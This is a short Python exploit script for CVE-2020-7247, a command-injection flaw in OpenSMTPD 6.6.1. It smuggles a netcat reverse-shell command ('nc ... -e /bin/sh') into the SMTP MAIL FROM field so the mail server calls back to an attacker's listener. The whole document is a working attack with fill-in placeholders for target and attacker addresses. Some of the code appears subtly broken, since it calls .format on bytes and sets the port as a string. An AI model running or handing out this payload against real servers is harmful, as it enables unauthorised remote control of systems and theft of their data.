# OpenSMTPD 6.6.1 - Remote Code Execution
# Tested on: Ubuntu 22.04.4 LTS
# CVE: CVE-2020-7247

import socket 
TARGET = 'target_ip'
TARGET_PORT = 'target_port'
IP = 'your_ip'
PORT = 'your_port'
PAYLOAD = 'nc {} {} -e /bin/sh'.format(IP, PORT) # change this to any payload you want

# nc -lvnp 9001
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((TARGET, TARGET_PORT))
    except socket.error:
        print("Connection failed")
        exit(1)
    s.recv(1024)
    s.send(b'HELO x')
    s.recv(1024)
    print("Sending payload...")
    s.send(b'MAIL FROM:<;{};>'.format(PAYLOAD.encode()))
    print("Payload sent. Delivering shell to {}:{}...".format(IP, PORT))
    s.recv(1024)
    s.send(b'RCPT TO:<root@localhost>')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'aaa\r\n')
    s.recv(1024)
    s.send(b'.')
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')

print("OK.")